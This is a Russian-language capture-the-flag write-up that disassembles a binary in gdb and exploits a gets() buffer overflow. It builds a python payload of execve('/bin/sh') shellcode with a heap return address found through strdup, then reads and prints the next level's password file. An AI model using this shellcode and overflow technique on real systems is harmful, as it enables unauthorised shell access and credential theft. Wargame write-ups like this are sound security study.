Продолжаем анализировать исполняющий файл при помощи gdb.
info functions:
0x080483a0  printf
0x080483b0  fflush
0x080483c0  gets
0x080483d0  _exit
0x080483e0  strdup
0x080483f0  puts
0x080484d4  p
0x0804853f  main


> disass main                               В функции main происходит толкьо вызов функции p
   0x08048545 <+6>:	call   0x80484d4 <p>
> disass p
Dump of assembler code for function p:
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>               функция fflush принудительно записывает все буферизированные
                                                                    данные в устройство вывода данных или корректирует поток stream
                                                                    посредством определенных для него функций записи. При этом поток остается открытым.
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax                     Размер памяти отведенной под буфер
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>                 считывает строку из stdin и записывает ее в буфер,
                                                                    на который указывает s, пока не встретится символ новой строки или EOF.
                                                                    Проверка на переполнение буфера не производится
   0x080484fb <+39>:	and    $0xb0000000,%eax                     это логичнеское and
   0x08048500 <+44>:	cmp    $0xb0000000,%eax                     сравнение двух переменных $0xb0000000 и %eax 
   0x08048505 <+49>:	jne    0x8048527 <p+83>                     команда jne(переход, если не равно) переход на строку позже вызова функции execv.
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>               
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>                
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>                 записывает строку s и завершающий перевод строки в stdout.
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>               возвращает указатель на новую строку, являющуюся дубликатом строки


info addr execv
Symbol "execv" is at 0xb7ee4360 in a file compiled without debugging.




ltrace ./level2
> blabla
...
strdup("blabla") = 0x0804a008
...



python -c "print '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 59 * 'a' + '\x08\x04\xa0\x08'[::-1]" > /tmp/2

   /  b  i   n  /  s  h   
  2f 62 69  6e 2f 73 68 


cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02